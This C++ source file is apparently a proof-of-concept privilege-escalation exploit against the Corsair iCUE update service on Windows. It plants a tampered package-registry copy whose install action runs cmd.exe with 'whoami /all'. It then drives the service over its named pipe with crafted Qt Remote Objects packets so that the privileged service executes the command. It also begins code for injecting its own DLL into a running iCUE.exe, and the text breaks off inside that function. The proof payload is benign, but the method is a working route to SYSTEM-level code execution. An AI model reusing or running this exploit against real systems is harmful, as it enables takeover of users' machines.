#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <winsqlite/winsqlite3.h>

#include <algorithm>
#include <cstdint>
#include <cstring>
#include <limits>
#include <string>
#include <vector>

namespace icue2system {

using Bytes = std::vector<std::uint8_t>;

struct Packet {
  std::uint16_t id = 0;
  Bytes body;
};

struct MethodTable {
  int set_install_dir = -1;
  int run_actions = -1;
  int start_operation = -1;
};

class ByteWriter {
 public:
  void U8(std::uint8_t value) { bytes_.push_back(value); }
  void U16(std::uint16_t value) {
    U8(static_cast<std::uint8_t>(value));
    U8(static_cast<std::uint8_t>(value >> 8));
  }
  void U32(std::uint32_t value) {
    for (int shift = 0; shift < 32; shift += 8)
      U8(static_cast<std::uint8_t>(value >> shift));
  }
  void U64(std::uint64_t value) {
    for (int shift = 0; shift < 64; shift += 8)
      U8(static_cast<std::uint8_t>(value >> shift));
  }
  void Raw(const void* data, std::size_t size) {
    const auto* first = static_cast<const std::uint8_t*>(data);
    bytes_.insert(bytes_.end(), first, first + size);
  }
  void Utf16(const std::wstring& value) {
    U32(static_cast<std::uint32_t>(value.size() * sizeof(wchar_t)));
    for (wchar_t ch : value) U16(static_cast<std::uint16_t>(ch));
  }
  void ByteArray(const std::string& value) {
    U32(static_cast<std::uint32_t>(value.size()));
    Raw(value.data(), value.size());
  }
  const Bytes& bytes() const { return bytes_; }

 private:
  Bytes bytes_;
};

class ByteReader {
 public:
  explicit ByteReader(const Bytes& bytes) : bytes_(bytes) {}
  bool U8(std::uint8_t* value) {
    if (!value || remaining() < 1) return false;
    *value = bytes_[offset_++];
    return true;
  }
  bool U16(std::uint16_t* value) {
    std::uint8_t a = 0, b = 0;
    if (!U8(&a) || !U8(&b)) return false;
    *value = static_cast<std::uint16_t>(a | (b << 8));
    return true;
  }
  bool U32(std::uint32_t* value) {
    if (!value || remaining() < 4) return false;
    std::uint32_t result = 0;
    for (int shift = 0; shift < 32; shift += 8)
      result |= static_cast<std::uint32_t>(bytes_[offset_++]) << shift;
    *value = result;
    return true;
  }
  bool U64(std::uint64_t* value) {
    if (!value || remaining() < 8) return false;
    std::uint64_t result = 0;
    for (int shift = 0; shift < 64; shift += 8)
      result |= static_cast<std::uint64_t>(bytes_[offset_++]) << shift;
    *value = result;
    return true;
  }
  bool Utf16(std::wstring* value) {
    std::uint32_t bytes = 0;
    if (!value || !U32(&bytes) || bytes == 0xffffffff || (bytes & 1) ||
        bytes > remaining())
      return false;
    value->clear();
    value->reserve(bytes / 2);
    for (std::uint32_t i = 0; i < bytes; i += 2) {
      std::uint16_t ch = 0;
      if (!U16(&ch)) return false;
      value->push_back(static_cast<wchar_t>(ch));
    }
    return true;
  }
  bool ByteArray(std::string* value) {
    std::uint32_t size = 0;
    if (!value || !U32(&size) || size == 0xffffffff || size > remaining())
      return false;
    value->assign(reinterpret_cast<const char*>(bytes_.data() + offset_), size);
    offset_ += size;
    return true;
  }
  std::size_t remaining() const { return bytes_.size() - offset_; }

 private:
  const Bytes& bytes_;
  std::size_t offset_ = 0;
};

constexpr std::uint32_t kMaxPacket = 1024 * 1024;

bool SkipEnum(ByteReader* reader) {
  std::string text;
  std::uint8_t flag = 0;
  std::uint32_t size = 0, count = 0, value = 0;
  if (!reader->ByteArray(&text) || !reader->U8(&flag) || !reader->U8(&flag) ||
      !reader->U32(&size) || !reader->U32(&count) || count > 4096)
    return false;
  for (std::uint32_t i = 0; i < count; ++i)
    if (!reader->ByteArray(&text) || !reader->U32(&value)) return false;
  return true;
}

bool SkipByteArrayList(ByteReader* reader) {
  std::uint32_t count = 0;
  std::string text;
  if (!reader->U32(&count) || count > 4096) return false;
  for (std::uint32_t i = 0; i < count; ++i)
    if (!reader->ByteArray(&text)) return false;
  return true;
}

bool ParseDynamicMethods(const Packet& packet, MethodTable* methods) {
  if (!methods || packet.id != 3) return false;
  ByteReader reader(packet.body);
  std::wstring object_name, type_name;
  std::string text;
  std::uint32_t count = 0, inner = 0;
  if (!reader.Utf16(&object_name) || object_name != L"UpdateService" ||
      !reader.Utf16(&type_name) || !reader.U32(&count) || count > 4096)
    return false;
  for (std::uint32_t i = 0; i < count; ++i)
    if (!SkipEnum(&reader)) return false;

  if (!reader.U32(&count) || count > 4096) return false;
  for (std::uint32_t i = 0; i < count; ++i)
    if (!reader.ByteArray(&text)) return false;

  if (!reader.U32(&count) || count > 4096) return false;
  for (std::uint32_t i = 0; i < count; ++i) {
    if (!reader.ByteArray(&text) || !reader.U32(&inner) || inner > 4096)
      return false;
    for (std::uint32_t p = 0; p < inner; ++p)
      if (!reader.ByteArray(&text) || !reader.ByteArray(&text)) return false;
    if (!reader.U32(&inner) || inner > 4096) return false;
    for (std::uint32_t e = 0; e < inner; ++e)
      if (!SkipEnum(&reader)) return false;
  }

  if (!reader.U32(&count) || count > 4096) return false;
  for (std::uint32_t i = 0; i < count; ++i)
    if (!reader.ByteArray(&text) || !SkipByteArrayList(&reader)) return false;

  if (!reader.U32(&count) || count > 4096) return false;
  MethodTable found;
  bool seen_set = false, seen_run = false, seen_start = false;
  for (std::uint32_t i = 0; i < count; ++i) {
    std::string signature, return_type;
    if (!reader.ByteArray(&signature) || !reader.ByteArray(&return_type) ||
        !SkipByteArrayList(&reader))
      return false;
    if (signature == "setInstallDir(QString)") {
      if (seen_set) return false;
      seen_set = true;
      found.set_install_dir = static_cast<int>(i);
    } else if (signature ==
               "runActions(QString,QList<QString>,QString,QString)") {
      if (seen_run) return false;
      seen_run = true;
      found.run_actions = static_cast<int>(i);
    } else if (signature == "startOperation(quint64)") {
      if (seen_start) return false;
      seen_start = true;
      found.start_operation = static_cast<int>(i);
    }
  }
  if (!seen_set || !seen_run || !seen_start) return false;

  if (!reader.U32(&count) || count > 4096) return false;
  for (std::uint32_t i = 0; i < count; ++i)
    if (!reader.ByteArray(&text) || !reader.ByteArray(&text) ||
        !reader.ByteArray(&text))
      return false;
  *methods = found;
  return true;
}

bool ReadAll(HANDLE handle, void* output, std::size_t size) {
  if (!handle || handle == INVALID_HANDLE_VALUE || (!output && size))
    return false;
  auto* bytes = static_cast<std::uint8_t*>(output);
  std::size_t offset = 0;
  while (offset < size) {
    DWORD done = 0;
    const DWORD wanted = static_cast<DWORD>((std::min)(
        size - offset,
        static_cast<std::size_t>((std::numeric_limits<DWORD>::max)())));
    const BOOL ok = ReadFile(handle, bytes + offset, wanted, &done, nullptr);
    if ((!ok && GetLastError() != ERROR_MORE_DATA) || !done || done > wanted)
      return false;
    offset += done;
  }
  return true;
}

bool WriteAll(HANDLE handle, const void* input, std::size_t size) {
  if (!handle || handle == INVALID_HANDLE_VALUE || (!input && size))
    return false;
  const auto* bytes = static_cast<const std::uint8_t*>(input);
  std::size_t offset = 0;
  while (offset < size) {
    DWORD done = 0;
    const DWORD wanted = static_cast<DWORD>((std::min)(
        size - offset,
        static_cast<std::size_t>((std::numeric_limits<DWORD>::max)())));
    if (!WriteFile(handle, bytes + offset, wanted, &done, nullptr) || !done ||
        done > wanted)
      return false;
    offset += done;
  }
  return true;
}

bool ReadPacket(HANDLE pipe, Packet* packet) {
  if (!pipe || pipe == INVALID_HANDLE_VALUE || !packet) return false;
  std::uint8_t header[6]{};
  if (!ReadAll(pipe, header, sizeof(header))) return false;
  const std::uint32_t size = static_cast<std::uint32_t>(header[0]) |
                             (static_cast<std::uint32_t>(header[1]) << 8) |
                             (static_cast<std::uint32_t>(header[2]) << 16) |
                             (static_cast<std::uint32_t>(header[3]) << 24);
  if (size < 2 || size > kMaxPacket) return false;
  packet->id = static_cast<std::uint16_t>(header[4] | (header[5] << 8));
  if (packet->id < 1 || packet->id > 11) return false;
  packet->body.resize(size - 2);
  return packet->body.empty() ||
         ReadAll(pipe, packet->body.data(), packet->body.size());
}

bool WritePacket(HANDLE pipe, const Packet& packet) {
  if (!pipe || pipe == INVALID_HANDLE_VALUE || packet.id < 1 ||
      packet.id > 11 || packet.body.size() > kMaxPacket - 2)
    return false;
  const std::uint32_t size = static_cast<std::uint32_t>(packet.body.size() + 2);
  const std::uint8_t header[] = {
      static_cast<std::uint8_t>(size), static_cast<std::uint8_t>(size >> 8),
      static_cast<std::uint8_t>(size >> 16),
      static_cast<std::uint8_t>(size >> 24),
      static_cast<std::uint8_t>(packet.id),
      static_cast<std::uint8_t>(packet.id >> 8)};
  return WriteAll(pipe, header, sizeof(header)) &&
         (packet.body.empty() ||
          WriteAll(pipe, packet.body.data(), packet.body.size()));
}

std::string WideToUtf8(const std::wstring& value) {
  if (value.empty()) return {};
  const int size = WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS,
                                       value.data(),
                                       static_cast<int>(value.size()), nullptr,
                                       0, nullptr, nullptr);
  if (size <= 0) return {};
  std::string result(size, '\0');
  if (WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS, value.data(),
                          static_cast<int>(value.size()), result.data(), size,
                          nullptr, nullptr) != size)
    return {};
  return result;
}

bool ExecSql(sqlite3* db, const char* sql) {
  return sqlite3_exec(db, sql, nullptr, nullptr, nullptr) == SQLITE_OK;
}

bool NextSqlId(sqlite3* db, const char* table, const char* column,
               sqlite3_int64* result) {
  const std::string sql = std::string("SELECT COALESCE(MAX(\"") + column +
                          "\"),0)+1 FROM \"" + table + "\"";
  sqlite3_stmt* statement = nullptr;
  bool ok = sqlite3_prepare_v2(db, sql.c_str(), -1, &statement, nullptr) ==
                SQLITE_OK &&
            sqlite3_step(statement) == SQLITE_ROW;
  if (ok) *result = sqlite3_column_int64(statement, 0);
  sqlite3_finalize(statement);
  return ok;
}

std::string JsonString(const std::string& value) {
  std::string result = "\"";
  for (unsigned char ch : value) {
    if (ch == '\\' || ch == '"') result.push_back('\\');
    result.push_back(static_cast<char>(ch));
  }
  result.push_back('"');
  return result;
}

bool PrepareRegistryCopy(const std::wstring& source, const std::wstring& copy,
                         const std::wstring& output) {
  DeleteFileW(copy.c_str());
  if (!CopyFileW(source.c_str(), copy.c_str(), TRUE)) return false;

  sqlite3* db = nullptr;
  const std::string path = WideToUtf8(copy);
  if (path.empty() ||
      sqlite3_open_v2(path.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) !=
          SQLITE_OK) {
    if (db) sqlite3_close(db);
    DeleteFileW(copy.c_str());
    return false;
  }

  sqlite3_int64 package_id = 999999, info_id = 0, action_id = 0;
  sqlite3_stmt* statement = nullptr;
  bool ok = ExecSql(db, "BEGIN IMMEDIATE") &&
            ExecSql(db,
                    "DELETE FROM run_executable_actions WHERE package_id IN "
                    "(SELECT package_id FROM packages WHERE "
                    "name='codex-probe')") &&
            ExecSql(db,
                    "DELETE FROM installed_info WHERE package_id IN (SELECT "
                    "package_id FROM packages WHERE name='codex-probe')") &&
            ExecSql(db, "DELETE FROM packages WHERE name='codex-probe'");

  if (ok) {
    ok = sqlite3_prepare_v2(
             db, "SELECT 1 FROM packages WHERE package_id=? LIMIT 1", -1,
             &statement, nullptr) == SQLITE_OK &&
         sqlite3_bind_int64(statement, 1, package_id) == SQLITE_OK;
    if (ok && sqlite3_step(statement) == SQLITE_ROW)
      ok = NextSqlId(db, "packages", "package_id", &package_id);
    sqlite3_finalize(statement);
    statement = nullptr;
  }
  if (ok)
    ok = NextSqlId(db, "installed_info", "info_id", &info_id) &&
         NextSqlId(db, "run_executable_actions", "action_id", &action_id);

  if (ok) {
    const char* sql =
        "INSERT INTO packages(package_id,type,architecture,homepage,license,"
        "name,version,install_size,download_size) VALUES "
        "(?,'installed','win32-release-amd64',NULL,NULL,'codex-probe',"
        "'1.0.0',0,-1)";
    ok = sqlite3_prepare_v2(db, sql, -1, &statement, nullptr) == SQLITE_OK &&
         sqlite3_bind_int64(statement, 1, package_id) == SQLITE_OK &&
         sqlite3_step(statement) == SQLITE_DONE;
    sqlite3_finalize(statement);
    statement = nullptr;
  }
  if (ok) {
    const char* sql =
        "INSERT INTO installed_info(info_id,package_id,installed_date,"
        "installed_reason,installed_size) VALUES "
        "(?,?,'2026-10-29T00:00:00Z','ManualInstallation',0)";
    ok = sqlite3_prepare_v2(db, sql, -1, &statement, nullptr) == SQLITE_OK &&
         sqlite3_bind_int64(statement, 1, info_id) == SQLITE_OK &&
         sqlite3_bind_int64(statement, 2, package_id) == SQLITE_OK &&
         sqlite3_step(statement) == SQLITE_DONE;
    sqlite3_finalize(statement);
    statement = nullptr;
  }
  if (ok) {
    std::string output_utf8 = WideToUtf8(output);
    std::replace(output_utf8.begin(), output_utf8.end(), '\\', '/');
    const bool safe_output =
        !output_utf8.empty() &&
        output_utf8.find_first_of(" \"&|<>^") == std::string::npos;
    const std::string args =
        "[\"/d\",\"/c\"," +
        JsonString("C:\\Windows\\System32\\whoami.exe /all > " +
                   output_utf8) +
        "]";
    const char* sql =
        "INSERT INTO run_executable_actions(action_id,package_id,path,"
        "install_args,uninstall_args,success_exit_codes,check_args,"
        "uninstall_on_upgrade,reboot_on_install,reboot_on_uninstall,"
        "reboot_on_upgrade) VALUES "
        "(?,?,'InstallDirectory/cmd.exe',?,'[]','[0]','[]',1,0,0,0)";
    ok = safe_output &&
         sqlite3_prepare_v2(db, sql, -1, &statement, nullptr) == SQLITE_OK &&
         sqlite3_bind_int64(statement, 1, action_id) == SQLITE_OK &&
         sqlite3_bind_int64(statement, 2, package_id) == SQLITE_OK &&
         sqlite3_bind_text(statement, 3, args.c_str(),
                           static_cast<int>(args.size()), SQLITE_TRANSIENT) ==
             SQLITE_OK &&
         sqlite3_step(statement) == SQLITE_DONE;
    sqlite3_finalize(statement);
  }
  ok = ok && ExecSql(db, "COMMIT");
  if (!ok) ExecSql(db, "ROLLBACK");
  sqlite3_close(db);
  if (!ok) DeleteFileW(copy.c_str());
  return ok;
}

constexpr wchar_t kProductRoot[] =
    L"C:\\Program Files\\Corsair\\Corsair iCUE5 Software";
constexpr wchar_t kServiceName[] = L"iCUEUpdateService";

bool PrepareControlledRootFrom(const std::wstring& root,
                               const std::wstring& source_registry,
                               const std::wstring& source_command) {
  if (root.empty()) return false;
  if (!CreateDirectoryW(root.c_str(), nullptr) &&
      GetLastError() != ERROR_ALREADY_EXISTS)
    return false;
  const std::wstring registry = root + L"\\cuepkg.registry";
  const std::wstring command = root + L"\\cmd.exe";
  const std::wstring output = root + L"\\whoami.txt";
  DeleteFileW(registry.c_str());
  DeleteFileW(command.c_str());
  DeleteFileW(output.c_str());
  if (!PrepareRegistryCopy(source_registry, registry, output) ||
      !CopyFileW(source_command.c_str(), command.c_str(), FALSE)) {
    DeleteFileW(registry.c_str());
    DeleteFileW(command.c_str());
    return false;
  }
  return true;
}

bool PrepareControlledRoot(const std::wstring& root) {
  return PrepareControlledRootFrom(
      root, std::wstring(kProductRoot) + L"\\cuepkg.registry",
      L"C:\\Windows\\System32\\cmd.exe");
}

struct ServiceState {
  SC_HANDLE handle = nullptr;
  bool started_by_poc = false;
};

bool QueryServiceState(SC_HANDLE service, DWORD* state) {
  SERVICE_STATUS_PROCESS status{};
  DWORD needed = 0;
  if (!service || !state ||
      !QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
                            reinterpret_cast<BYTE*>(&status), sizeof(status),
                            &needed))
    return false;
  *state = status.dwCurrentState;
  return true;
}

bool WaitForServiceState(SC_HANDLE service, DWORD desired,
                         DWORD timeout_ms = 15000) {
  const ULONGLONG deadline = GetTickCount64() + timeout_ms;
  do {
    DWORD state = 0;
    if (!QueryServiceState(service, &state)) return false;
    if (state == desired) return true;
    Sleep(100);
  } while (GetTickCount64() < deadline);
  return false;
}

bool StartUpdateService(ServiceState* state) {
  if (!state) return false;
  SC_HANDLE manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
  if (!manager) return false;
  state->handle = OpenServiceW(manager, kServiceName,
                               SERVICE_QUERY_STATUS | SERVICE_START |
                                   SERVICE_STOP);
  CloseServiceHandle(manager);
  if (!state->handle) return false;
  DWORD current = 0;
  if (!QueryServiceState(state->handle, &current)) return false;
  if (current == SERVICE_RUNNING) return true;
  if (!StartServiceW(state->handle, 0, nullptr) &&
      GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
    return false;
  state->started_by_poc = true;
  return WaitForServiceState(state->handle, SERVICE_RUNNING);
}

void RestoreUpdateService(ServiceState* state) {
  if (!state || !state->handle) return;
  DWORD current = 0;
  if (state->started_by_poc && QueryServiceState(state->handle, &current) &&
      current != SERVICE_STOPPED) {
    SERVICE_STATUS ignored{};
    ControlService(state->handle, SERVICE_CONTROL_STOP, &ignored);
    WaitForServiceState(state->handle, SERVICE_STOPPED);
  }
  CloseServiceHandle(state->handle);
  state->handle = nullptr;
}

Packet AddObjectPacket() {
  ByteWriter body;
  body.Utf16(L"UpdateService");
  body.U8(1);
  return {4, body.bytes()};
}

void StringVariant(ByteWriter* body, const std::wstring& value) {
  body->U32(10);
  body->U8(0);
  body->Utf16(value);
}

void NullStringVariant(ByteWriter* body) {
  body->U32(10);
  body->U8(0);
  body->U32(0xffffffff);
}

Packet SetInstallDirPacket(int index, const std::wstring& root) {
  ByteWriter body;
  body.Utf16(L"UpdateService");
  body.U32(0);
  body.U32(static_cast<std::uint32_t>(index));
  body.U32(1);
  StringVariant(&body, root);
  body.U32(0xffffffff);
  body.U32(0xffffffff);
  return {6, body.bytes()};
}

Packet RunActionsPacket(int index) {
  ByteWriter body;
  body.Utf16(L"UpdateService");
  body.U32(0);
  body.U32(static_cast<std::uint32_t>(index));
  body.U32(4);
  StringVariant(&body, L"install");
  body.U32(11);
  body.U8(0);
  body.U32(1);
  body.Utf16(L"codex-probe");
  NullStringVariant(&body);
  NullStringVariant(&body);
  body.U32(1);
  body.U32(0xffffffff);
  return {6, body.bytes()};
}

Packet StartOperationPacket(int index, std::uint64_t operation) {
  ByteWriter body;
  body.Utf16(L"UpdateService");
  body.U32(0);
  body.U32(static_cast<std::uint32_t>(index));
  body.U32(1);
  body.U32(5);
  body.U8(0);
  body.U64(operation);
  body.U32(2);
  body.U32(0xffffffff);
  return {6, body.bytes()};
}

bool ValidateHandshake(const Packet& packet) {
  if (packet.id != 1) return false;
  ByteReader reader(packet.body);
  std::wstring version;
  return reader.Utf16(&version) && version == L"QtRO 2.0" &&
         reader.remaining() == 0;
}

bool ValidateObjectList(const Packet& packet) {
  if (packet.id != 9) return false;
  ByteReader reader(packet.body);
  std::uint32_t count = 0;
  if (!reader.U32(&count) || !count || count > 4096) return false;
  bool found = false;
  for (std::uint32_t i = 0; i < count; ++i) {
    std::wstring name, type;
    std::string signature;
    if (!reader.Utf16(&name) || !reader.Utf16(&type) ||
        !reader.ByteArray(&signature))
      return false;
    if (name == L"UpdateService" && type == L"UpdateService") found = true;
  }
  return found && reader.remaining() == 0;
}

bool VariantHeader(ByteReader* reader, std::uint32_t expected) {
  std::uint32_t type = 0;
  std::uint8_t is_null = 0;
  return reader->U32(&type) && type == expected && reader->U8(&is_null) &&
         is_null == 0;
}

bool NullQString(ByteReader* reader) {
  std::uint32_t size = 0;
  return VariantHeader(reader, 10) && reader->U32(&size) && size == 0xffffffff;
}

bool IsWireTypeName(const std::string& value, const char* expected) {
  const std::size_t length = std::strlen(expected);
  return value.size() == length + 1 && value.back() == '\0' &&
         std::memcmp(value.data(), expected, length) == 0;
}

bool ParseRunActionsReply(const Packet& packet, std::uint64_t* operation) {
  if (!operation || packet.id != 7) return false;
  ByteReader reader(packet.body);
  std::wstring name;
  std::string type_name;
  std::uint32_t serial = 0, error = 1;
  std::uint64_t value = 0;
  std::uint8_t flag = 0;
  if (!reader.Utf16(&name) || name != L"UpdateService" ||
      !reader.U32(&serial) || serial != 1 ||
      !VariantHeader(&reader, 0x10000) ||
      !reader.ByteArray(&type_name) ||
      !IsWireTypeName(type_name, "PkgToolResult") ||
      !VariantHeader(&reader, 0x10000) ||
      !reader.ByteArray(&type_name) ||
      !IsWireTypeName(type_name, "PkgToolError") ||
      !VariantHeader(&reader, 2) || !reader.U32(&error) || error != 0 ||
      !NullQString(&reader) || !VariantHeader(&reader, 0x10000) ||
      !reader.ByteArray(&type_name) ||
      !IsWireTypeName(type_name, "PkgToolOperation") ||
      !VariantHeader(&reader, 5) || !reader.U64(&value) || value == 0 ||
      !VariantHeader(&reader, 1) || !reader.U8(&flag) ||
      !NullQString(&reader))
    return false;
  *operation = value;
  return true;
}

bool ValidateStartReply(const Packet& packet) {
  if (packet.id != 7) return false;
  ByteReader reader(packet.body);
  std::wstring name;
  std::uint32_t serial = 0;
  return reader.Utf16(&name) && name == L"UpdateService" &&
         reader.U32(&serial) && serial == 2;
}

bool ReceiveStartReply(HANDLE pipe, Packet* packet) {
  for (int i = 0; i < 64; ++i) {
    if (!ReadPacket(pipe, packet)) return false;
    if (packet->id == 7) return ValidateStartReply(*packet);
    if (packet->id != 6 && packet->id != 8 && packet->id != 10 &&
        packet->id != 11)
      return false;
  }
  return false;
}

bool WaitForProof(HANDLE pipe, const std::wstring& output) {
  const ULONGLONG deadline = GetTickCount64() + 30000;
  do {
    DWORD available = 0;
    while (PeekNamedPipe(pipe, nullptr, 0, nullptr, &available, nullptr) &&
           available >= 6) {
      Packet event;
      if (!ReadPacket(pipe, &event)) break;
      available = 0;
    }
    WIN32_FILE_ATTRIBUTE_DATA data{};
    if (GetFileAttributesExW(output.c_str(), GetFileExInfoStandard, &data) &&
        (data.nFileSizeHigh || data.nFileSizeLow))
      return true;
    Sleep(200);
  } while (GetTickCount64() < deadline);
  return false;
}

bool RunRpcSession(HANDLE pipe, const std::wstring& root,
                   const std::wstring& normal_root) {
  if (!pipe || pipe == INVALID_HANDLE_VALUE || root.empty() ||
      normal_root.empty()) return false;
  Packet packet;
  if (!ReadPacket(pipe, &packet) ||
      !ValidateHandshake(packet) ||
      !ReadPacket(pipe, &packet) ||
      !ValidateObjectList(packet) ||
      !WritePacket(pipe, AddObjectPacket()) ||
      !ReadPacket(pipe, &packet))
    return false;
  MethodTable methods;
  if (!ParseDynamicMethods(packet, &methods)) return false;
  if (!WritePacket(pipe, SetInstallDirPacket(methods.set_install_dir, root)))
    return false;

  bool ok = WritePacket(pipe, RunActionsPacket(methods.run_actions));
  std::uint64_t operation = 0;
  if (ok) ok = ReadPacket(pipe, &packet);
  if (ok) ok = ParseRunActionsReply(packet, &operation);
  if (ok)
    ok = WritePacket(
        pipe,
        StartOperationPacket(methods.start_operation, operation));
  if (ok) ok = ReceiveStartReply(pipe, &packet);
  if (ok) ok = WaitForProof(pipe, root + L"\\whoami.txt");
  const bool restored = WritePacket(
      pipe,
      SetInstallDirPacket(methods.set_install_dir, normal_root));
  return ok && restored;
}

bool RunUpdateRpc(const std::wstring& root) {
  constexpr wchar_t kPipe[] =
      L"\\\\.\\pipe\\Corsair_iCUE_Update_Service";
  if (!WaitNamedPipeW(kPipe, 10000) && GetLastError() != ERROR_SEM_TIMEOUT)
    return false;
  HANDLE pipe = CreateFileW(kPipe, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (pipe == INVALID_HANDLE_VALUE) return false;
  DWORD mode = PIPE_READMODE_BYTE;
  SetNamedPipeHandleState(pipe, &mode, nullptr, nullptr);
  const bool result = RunRpcSession(pipe, root, kProductRoot);
  CloseHandle(pipe);
  return result;
}

struct TargetFacts {
  std::wstring image_path;
  DWORD current_session = 0;
  DWORD target_session = 0;
  std::wstring current_sid;
  std::wstring target_sid;
  DWORD current_integrity = 0;
  DWORD target_integrity = 0;
};

bool EqualInsensitive(const std::wstring& left, const std::wstring& right) {
  return CompareStringOrdinal(left.c_str(), static_cast<int>(left.size()),
                              right.c_str(), static_cast<int>(right.size()),
                              TRUE) == CSTR_EQUAL;
}

bool IsIcueHostName(const std::wstring& path) {
  const std::size_t slash = path.find_last_of(L"\\/");
  const std::wstring name =
      slash == std::wstring::npos ? path : path.substr(slash + 1);
  return EqualInsensitive(name, L"iCUE.exe");
}

bool ValidateTargetFacts(const TargetFacts& facts) {
  const std::wstring expected = std::wstring(kProductRoot) + L"\\iCUE.exe";
  return EqualInsensitive(facts.image_path, expected) &&
         facts.current_session == facts.target_session &&
         !facts.current_sid.empty() && facts.current_sid == facts.target_sid &&
         facts.target_integrity <= facts.current_integrity;
}

std::uintptr_t RemoteExportAddress(std::uintptr_t local_module,
                                   std::uintptr_t local_export,
                                   std::uintptr_t remote_module) {
  if (!local_module || local_export < local_module || !remote_module) return 0;
  const std::uintptr_t offset = local_export - local_module;
  if (remote_module > (std::numeric_limits<std::uintptr_t>::max)() - offset)
    return 0;
  return remote_module + offset;
}

HANDLE AcquireRunLock(const std::wstring& name) {
  SetLastError(ERROR_SUCCESS);
  HANDLE mutex = CreateMutexW(nullptr, TRUE, name.c_str());
  if (!mutex) return nullptr;
  if (GetLastError() == ERROR_ALREADY_EXISTS) {
    CloseHandle(mutex);
    return nullptr;
  }
  return mutex;
}

#ifndef ICUE2SYSTEM_TEST

HMODULE g_module = nullptr;

void Debug(const wchar_t* message) {
  OutputDebugStringW(L"[iCUE2SYSTEM] ");
  OutputDebugStringW(message);
  OutputDebugStringW(L"\r\n");
}

bool TokenSidAndIntegrity(HANDLE process, std::wstring* sid,
                          DWORD* integrity) {
  HANDLE token = nullptr;
  if (!OpenProcessToken(process, TOKEN_QUERY, &token)) return false;
  DWORD size = 0;
  GetTokenInformation(token, TokenUser, nullptr, 0, &size);
  Bytes user(size);
  bool ok = size && GetTokenInformation(token, TokenUser, user.data(), size,
                                        &size);
  LPWSTR sid_text = nullptr;
  if (ok) {
    const auto* token_user =
        reinterpret_cast<const TOKEN_USER*>(user.data());
    ok = ConvertSidToStringSidW(token_user->User.Sid, &sid_text) != FALSE;
  }
  if (ok) *sid = sid_text;
  if (sid_text) LocalFree(sid_text);

  size = 0;
  GetTokenInformation(token, TokenIntegrityLevel, nullptr, 0, &size);
  Bytes level(size);
  if (ok)
    ok = size && GetTokenInformation(token, TokenIntegrityLevel, level.data(),
                                     size, &size);
  if (ok) {
    const PSID level_sid =
        reinterpret_cast<const TOKEN_MANDATORY_LABEL*>(level.data())
            ->Label.Sid;
    const UCHAR count = *GetSidSubAuthorityCount(level_sid);
    ok = count != 0;
    if (ok) *integrity = *GetSidSubAuthority(level_sid, count - 1);
  }
  CloseHandle(token);
  return ok;
}

bool GetTargetFacts(DWORD pid, TargetFacts* facts) {
  if (!facts) return false;
  HANDLE target = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
  if (!target) return false;
  wchar_t path[32768]{};
  DWORD path_size = static_cast<DWORD>(std::size(path));
  bool ok = QueryFullProcessImageNameW(target, 0, path, &path_size) != FALSE;
  if (ok) facts->image_path.assign(path, path_size);
  facts->current_session = 0;
  facts->target_session = 0;
  ok = ok && ProcessIdToSessionId(GetCurrentProcessId(),
                                  &facts->current_session) &&
       ProcessIdToSessionId(pid, &facts->target_session);
  ok = ok && TokenSidAndIntegrity(GetCurrentProcess(), &facts->current_sid,
                                  &facts->current_integrity) &&
       TokenSidAndIntegrity(target, &facts->target_sid,
                            &facts->target_integrity);
  CloseHandle(target);
  return ok;
}

DWORD FindValidIcueProcess() {
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE) return 0;
  PROCESSENTRY32W entry{sizeof(entry)};
  DWORD result = 0;
  if (Process32FirstW(snapshot, &entry)) {
    do {
      if (!EqualInsensitive(entry.szExeFile, L"iCUE.exe")) continue;
      TargetFacts facts;
      if (GetTargetFacts(entry.th32ProcessID, &facts) &&
          ValidateTargetFacts(facts)) {
        result = entry.th32ProcessID;
        break;
      }
    } while (Process32NextW(snapshot, &entry));
  }
  CloseHandle(snapshot);
  return result;
}

DWORD StartAndFindIcue() {
  DWORD pid = FindValidIcueProcess();
  if (pid) return pid;
  const std::wstring path = std::wstring(kProductRoot) + L"\\iCUE.exe";
  std::vector<wchar_t> command(path.begin(), path.end());
  command.push_back(L'\0');
  STARTUPINFOW startup{sizeof(startup)};
  PROCESS_INFORMATION process{};
  if (!CreateProcessW(path.c_str(), command.data(), nullptr, nullptr, FALSE, 0,
                      nullptr, kProductRoot, &startup, &process))
    return 0;
  CloseHandle(process.hThread);
  CloseHandle(process.hProcess);
  const ULONGLONG deadline = GetTickCount64() + 20000;
  do {
    pid = FindValidIcueProcess();
    if (pid) return pid;
    Sleep(250);
  } while (GetTickCount64() < deadline);
  return 0;
}

std::uintptr_t RemoteModuleBase(DWORD pid, const wchar_t* module_name,
                                const std::wstring* reject_path = nullptr) {
  HANDLE snapshot = CreateToolhelp32Snapshot(
      TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
  if (snapshot == INVALID_HANDLE_VALUE) return 0;
  MODULEENTRY32W entry{sizeof(entry)};
  std::uintptr_t result = 0;
  if (Module32FirstW(snapshot, &entry)) {
    do {
      if (reject_path && EqualInsensitive(entry.szExePath, *reject_path)) {
        result = (std::numeric_limits<std::uintptr_t>::max)();
        break;
      }
      if (EqualInsensitive(entry.szModule, module_name))
        result = reinterpret_cast<std::uintptr_t>(entry.modBaseAddr);
    } while (Module32NextW(snapshot, &entry));
  }
  CloseHandle(snapshot);
  return result;
}

bool InjectSelf(DWORD pid) {
  wchar_t dll_path[32768]{};
  const DWORD length = GetModuleFileNameW(g_module, dll_path,
                                           static_cast<DWORD>(std::size(dll_path)));
  if (!length || length == std::size(dll_path)) return false;
  const std::wstring path(dll_path, length);
  const std::uintptr_t remote_kernel =
      RemoteModuleBase(pid, L"kernel32.dll", &path);
  if (!remote_kernel ||
      remote_kernel == (std::numeric_limits<std::uintptr_t>::max)())
    return false;
  const HMODULE local_kernel = GetModuleHandleW(L"kernel32.dll");
